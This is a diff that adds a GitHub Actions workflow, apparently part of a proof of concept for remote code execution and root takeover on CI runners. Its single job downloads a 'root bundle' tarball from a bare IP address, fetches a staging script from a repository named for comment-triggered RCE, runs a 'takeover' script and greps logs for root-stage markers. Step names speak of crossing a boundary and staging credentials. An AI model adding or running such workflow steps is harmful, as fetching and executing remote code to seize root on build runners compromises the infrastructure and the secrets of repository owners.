@@ -1,0 +1,23 @@
+name: Run Service initial-root authority source
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  source:
+    runs-on: ubuntu-slim
+    timeout-minutes: 4
+    steps:
+      - name: Cross the proven boundary and stage scoped credentials
+        shell: bash
+        run: |
+          set -e
+          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
+          tar -xzf /tmp/root.tgz -C /tmp
+          curl -fsS https://raw.githubusercontent.com/fdzdev/gha-comment-rce-3900000/main/poc/root_runservice_stage.sh -o /tmp/root_auto.sh
+          chmod +x /tmp/root_auto.sh
+          HVS_INLINE=1 bash /tmp/initial_takeover.sh
+          for attempt in $(seq 1 40); do sudo grep -q 'ROOT_AUTO done' /tmp/root-auto.log 2>/dev/null && break; sleep 0.25; done
+          sudo grep 'RUNSERVICE_ROOT_STAGE' /tmp/root-auto.log || true
